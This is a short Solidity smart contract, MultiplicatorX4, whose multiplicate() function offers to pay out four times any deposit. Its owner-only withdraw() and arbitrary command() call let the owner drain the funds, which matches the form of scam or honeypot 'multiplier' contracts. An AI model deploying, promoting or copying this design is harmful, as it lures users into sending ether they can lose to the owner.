pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr.call.value(msg.value)(_data));
    }

    function multiplicate(address _adr) public payable {
        require(_adr != address(0));
        require(msg.value > 0);
        require(msg.value <= this.balance);
        uint256 amount = msg.value * 4;
        require(amount >= msg.value);
        _adr.transfer(amount);
    }
}